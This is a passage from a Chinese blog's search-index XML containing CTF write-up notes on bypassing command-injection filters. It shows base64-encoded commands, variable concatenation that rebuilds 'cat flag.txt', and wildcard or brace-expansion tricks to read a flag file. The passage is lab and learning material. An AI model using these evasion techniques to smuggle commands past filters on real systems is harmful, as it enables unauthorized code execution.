&#x27;Y2F0Cg==&#x27; | base64 -d`  flag.txt #cat </span><br></pre></td></tr></table></figure><h4 id="拼接绕过">拼接绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag;e=.txt;$a$b $c$d$e</span><br></pre></td></tr></table></figure><h4 id="通配符绕过">通配符绕过</h4><blockquote><p>[…]表示匹配方括号之中的任意一个字符</p><p>{…}表示匹配大括号里面的所有模式</p><p>上述二则的区别，当匹配的文件不存在时，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat f?ag.txt</span><br><span class="line">cat fl*</span><br><span class="line">cat f[a-z]ag.txt</span><br><span class="line">cat fl&#123;a,b,c,d,e&#125;g.txt</span><br></pre></td></tr></table></figure><p><img src="/2024/07/14/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/rce1_1_3.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 二分法 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
